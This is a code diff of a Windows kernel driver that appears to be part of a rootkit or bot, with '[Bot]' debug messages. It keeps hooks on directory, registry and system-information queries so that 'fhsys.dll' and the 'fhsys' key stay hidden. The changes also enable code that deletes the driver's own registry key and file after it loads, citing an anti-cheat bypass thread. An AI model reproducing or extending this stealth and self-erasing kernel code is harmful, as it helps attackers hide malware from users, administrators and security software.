@@ -62,12 +62,16 @@ NtQueryDirectoryFileEx_t origNtQueryDirectoryFileEx;
 NtEnumerateKey_t origNtEnumerateKey;
 NtQuerySystemInformation_t origNtQuerySystemInformation;
 
+PVOID ImageBase;
+
 NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
 	HANDLE han;
 	OBJECT_ATTRIBUTES oa;
 	IO_STATUS_BLOCK io;
 	NTSTATUS status;
-	UNICODE_STRING us;
+	UNICODE_STRING fileName;
+	CHAR asBuf[257], *moduleName;
+	ANSI_STRING as;
 	PFILE_OBJECT ob;
 	PSECTION_OBJECT_POINTERS secObPtr;
 	ULONG i, n;
@@ -79,6 +83,21 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 
 	RtlInitUnicodeString(&hiddenFile, L"fhsys.dll");
 	RtlInitUnicodeString(&hiddenReg, L"fhsys");
+
+	IoQueryFullDriverPath(DriverObject, &fileName);
+	as.Buffer = asBuf;
+	as.Length = 0;
+	as.MaximumLength = 256;
+	RtlUnicodeStringToAnsiString(&as, &fileName, FALSE);
+	moduleName = as.Buffer;
+	for (i = 0; i < as.Length; ++i) {
+		if (as.Buffer[i] == '\\' && (i + 1) != as.Length) {
+			moduleName = &as.Buffer[i + 1];
+		}
+	}
+	as.Buffer[as.Length] = 0;
+
+	getKernelModuleByName(moduleName, &ImageBase, NULL);
 
 	keyArrLock = ExAllocatePoolWithTag(NonPagedPool, sizeof(KSPIN_LOCK) + MAX_KEYHANDLEARR * sizeof(HANDLE), rand_tag(&state));
 	keyHandleArr = (PHANDLE)(((uint8_t*)keyArrLock) + sizeof(KSPIN_LOCK));
@@ -130,22 +149,19 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 
 	DbgPrintEx(0, 0, "[Bot] %wZ\n", *RegistryPath);
 
-	/*
 	InitializeObjectAttributes(&oa, RegistryPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
 	ZwOpenKey(&han, KEY_ALL_ACCESS, &oa);
 	status = ZwDeleteKey(han);
 	DbgPrintEx(0, 0, "[Bot] Delete key %x\n", status);
 	ZwClose(han);
-	*/
 
 	//NOTE: loaderloader first run: icudtl.dat
 	//NOTE: loaderloader installed: fhsys.dll
 
-	IoQueryFullDriverPath(DriverObject, &us);
-	DbgPrintEx(0, 0, "[Bot] %wZ\n", us);
+	DbgPrintEx(0, 0, "[Bot] %wZ\n", fileName);
 
 	//https://www.unknowncheats.me/forum/anti-cheat-bypass/263872-driver-destroy.html
-	InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
+	InitializeObjectAttributes(&oa, &fileName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
 	status = IoCreateFileEx(&han, SYNCHRONIZE | DELETE, &oa, &io, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_DELETE, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0, CreateFileTypeNone, NULL, IO_NO_PARAMETER_CHECKING, NULL);
 	DbgPrintEx(0, 0, "[Bot] CreateFileEx %x\n", status);
 
@@ -162,7 +178,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 	status = ZwDeleteFile(&oa);
 	DbgPrintEx(0, 0, "[Bot] Delete file %x\n", status);
 
-	ExFreePool(us.Buffer);
+	ExFreePool(fileName.Buffer);
 
 	status = PsCreateSystemThread(&han, 0, NULL, NULL, NULL, thread, NULL);
 	DbgPrintEx(0, 0, "[Bot] Thread %x\n", status);
